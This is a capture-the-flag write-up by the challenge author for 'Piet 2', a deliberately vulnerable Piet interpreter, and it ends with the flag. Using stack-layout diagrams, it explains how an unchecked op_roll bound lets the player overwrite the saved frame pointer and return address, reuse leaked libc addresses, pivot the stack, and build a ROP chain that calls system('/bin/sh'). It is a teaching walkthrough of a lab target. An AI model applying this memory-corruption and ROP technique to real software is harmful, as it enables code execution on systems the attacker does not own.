## Piet 2 Solution
### Author: kyc

In this second challenge, op_up and op_down have been removed. Also, op_in_c
and op_nuh_uh immediately exit, so they can't be used to leak information about
the state of the program (which is an alternative solution to the original
challenge). And finally, even other commands cannot push above stack_depth = 256
or pop below stack_depth = 0, the bounds of the stack.

Here is the stack memory layout at interpret_program. Each row is 4 u32s:

```
           #################################################################################
rbp-0x430  # &stack                                # stack_depth       # CC                # -+
           #################################################################################  |
rbp-0x420  # DP                # row               # col               # 0                 #  |
           #################################################################################  |
rbp-0x410  # stack[0]          # stack[1]          # stack[2]          # stack[3]          #  |
           #################################################################################  |
rbp-0x400  # stack[4]          # stack[5]          # stack[6]          # stack[7]          #  |
           #################################################################################  |  interpret_program stack frame
           ...                                                                                |
           #################################################################################  |
rbp-0x20   # stack[252]        # stack[253]        # stack[254]        # stack[255]        #  |
           #################################################################################  |
rbp-0x10   # 0                                     # canary                                #  |
           #################################################################################  |
rbp        # prev rbp                              # return to main                        # -+
           #################################################################################
rbp+0x10   # img height        #  img width        #                                       # -+
           #################################################################################  |  main stack frame
rbp+0x20   #                                       # return to libc                        # -+
           #################################################################################
```

The only known exploitable bug is that op_roll doesn't check that
d < stack_depth. This means it is possible to roll the variables below the
stack, which hold the state of the Piet program:

However, the roll must be done carefully, to avoid causing an error:

    op_push(266)   # what we want to set stack_depth to be
    op_roll(2, 1)
    op_pop

```
           #################################################################################
rbp-0x430  # &stack                                # stack_depth = 0   # CC = 1            #
           #################################################################################
rbp-0x420  # DP = 2            # row = 1           # col = 0           # 266               #
           #################################################################################
rbp-0x410  # stack[0]          # stack[1]          # stack[2]          # stack[3]          #
           #################################################################################
```
Now do:

    op_roll(6, 1)
```
           #################################################################################
rbp-0x430  # &stack                                # stack_depth = 266 # CC = 2            #
           #################################################################################
rbp-0x420  # DP = 1            # row = 2           # col = 1           # 0                 #
           #################################################################################
rbp-0x410  # stack[0]          # stack[1]          # stack[2]          # stack[3]          #
           #################################################################################
           ...
           #################################################################################
rbp-0x10   # stack[256]                            # stack[258]  (canary)                  #
           #################################################################################
rbp        # stack[260]  (prev rbp)                # stack[262]  (return to main)          #
           #################################################################################
rbp+0x10   # img height = 20   #  img width = 40   # stack[266]                            #
           #################################################################################
```
We've now set stack_depth = 266. The reason for this is because at stack[266],
the top two values are the height and width of the image! We can control them
to be 40 and 20. This lets us roll the (prev rbp) and (return to main) values
into the valid areas of the stack, so we can freely perform operations on them.

However, we still need libc addresses. We can experimentally determine that
before op_roll(40, 20), there are "stdout" libc addresses at stack[230] and
stack[246], which get rolled to stack[250] and stack[226] respectively:

    op_roll(40, 20)
```
           #################################################################################
rbp-0x90   # stack[224]                            # stack[226]  (stdout)                  # -+
           #################################################################################  |
rbp-0x80   # stack[228]                            # stack[230]                            #  |
           #################################################################################  |
rbp-0x70   # stack[232]                            # stack[234]                            #  |  swapped by op_roll(40, 20)
           #################################################################################  |
rbp-0x60   # stack[236]                            # stack[238]  (canary)                  #  |
           #################################################################################  |
rbp-0x50   # stack[240]  (prev rbp)                # stack[242]  (return to main)          # -+
           #################################################################################
rbp-0x40   # stack[244]                            # stack[246]                            # -+
           #################################################################################  |
rbp-0x30   # stack[248]                            # stack[250]  (stdout)                  #  |
           #################################################################################  |
rbp-0x20   # stack[252]                            # stack[254]                            #  |  swapped by op_roll(40, 20)
           #################################################################################  |
rbp-0x10   # stack[256]                            # stack[258]                            #  |
           #################################################################################  |
rbp        # stack[260]                            # stack[262]  <- current top of stack   # -+
           #################################################################################
```
The rbp and return address are now in valid areas of the stack, so we can freely
make changes. Afterwards, we can do the same op_roll(40, 20) again to move the
changed values back to their original positions.

We'll

1. write a ROP chain starting at stack[226]. After the second op_roll(64, 32),
   this will be moved to stack[246].
2. overwrite stack[240] and stack[242] with a stack pivot to stack[246].

We have to work from the top of the stack to the bottom, so first we do (2).
First step: roll the stdout address to stack[244], and add the stack pivot
gadget at stack[246]:

    pop 12 times  (to stack[250])
    roll(8, 2)    (stdout moves to stack[244])
    pop 6 times
    push stack pivot gadget
```
           #################################################################################
rbp-0x60   # stack[236]                            # stack[238]  (canary)                  #
           #################################################################################
rbp-0x50   # stack[240]  (prev rbp)                # stack[242]  (return to main)          #
           #################################################################################
rbp-0x40   # stack[244]  (stdout)                  # stack[246]  (leave; ret; gadget)      #  <- current top of stack
           #################################################################################
rbp-0x30   # stack[248]                            # stack[246]                            #
           #################################################################################
```
Then roll the (prev rbp) stack address to the top, so we can push the
new stack address (where we'll pivot the stack to):

    roll(8, 6)    (prev rbp moves to top, stack[250])
    push new rbp
```
           #################################################################################
rbp-0x60   # stack[236]                            # stack[238]  (canary)                  #
           #################################################################################
rbp-0x50   # stack[240]  (return to main)          # stack[242]  (stdout)                  #
           #################################################################################
rbp-0x40   # stack[244]  (leave; ret; gadget)      # stack[246]  (prev rbp)                #
           #################################################################################
rbp-0x30   # stack[248]  (&stack[246] = rbp-0x38)  <- current top of stack                 #
           #################################################################################
```
Now roll the new values to the correct places:

    roll(6, 2)  (moves the new rbp to stack[244] and the new rip to stack[250])
    pop 2 times
    roll(8, 4)  (moves the new rbp to stack[240] and the new rip to stack[242])
```
           #################################################################################
rbp-0x60   # stack[236]                            # stack[238]  (canary)                  #
           #################################################################################
rbp-0x50   # stack[240]  (&stack[246] = rbp-0x38)  # stack[242]  (leave; ret; gadget)      #
           #################################################################################
rbp-0x40   # stack[244]  (return to main)          # stack[246]  (stdout)                  #  <- current top of stack
           #################################################################################
rbp-0x30   # stack[248]  (prev rbp)                # stack[250]                            #
           #################################################################################
```
Now, we can do (1). Pop until stack[226] is the top of the stack, and construct
the ROP chain:
```
           #################################################################################
rbp-0x90   # stack[224]                            # stack[226]  (stdout)                  # -+
           #################################################################################  |
rbp-0x80   # stack[228]  (pop rdi; ret; gadget)    # stack[230]  (/bin/sh)                 #  |
           #################################################################################  |
rbp-0x70   # stack[232]  (system)  <- current top of stack                                 #  |  swapped by op_roll(40, 20)
           #################################################################################  |
rbp-0x60   # stack[236]                            # stack[238]  (canary)                  #  |
           #################################################################################  |
rbp-0x50   # stack[240]  (&stack[246] = rbp-0x38)  # stack[242]  (leave; ret; gadget)      # -+
           #################################################################################
rbp-0x40   # stack[244]  (return to main)          # stack[246]  (stdout)                  # -+
           #################################################################################  |
rbp-0x30   # stack[248]  (prev rbp)                # stack[250]                            #  |
           #################################################################################  |
rbp-0x20   # stack[252]                            # stack[254]                            #  |  swapped by op_roll(40, 20)
           #################################################################################  |
rbp-0x10   # stack[256]                            # stack[258]                            #  |
           #################################################################################  |
rbp        # stack[260]                            # stack[262]                            # -+
           #################################################################################
```
We can now do the second op_roll(40, 20) in the same way as the first. This is
a bit tricky to do using pixels that don't overlap with the first
op_roll(40, 20), but it can be done. The final state has a stack pivot in rbp
that points to a ROP chain at stack[226].

Flag: `L3AK{iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAIAAABLMMCEAAAAS0lEQVR4nDWOyRHAMAgD1xn3RUqXKlMG43xAgA5QJEVJd2XQAxSAqQYu28VQgVsPfQ81in0PmJWD1np7hkQeyS/s0Gt1sjt3tvPFB4YbUaQJ6Uf/AAAAAElFTkSuQmCC}`

---

Note: this challenge came about because there were many different ways to solve
Piet 1, and I wanted to see how many additional restrictions I could add while
still having a solvable challenge. I was excited to find that I could solve it
with only the ``op_roll`` vulnerability, and I thought that was interesting because
``op_roll`` is probably the "most interesting" operation in the Piet programming
language.

In fact, no changes were made to the original Piet program written for Piet 1,
other than introducing the op_roll vulnerability (and unrelated stylistic
changes that didn't affect the solve).
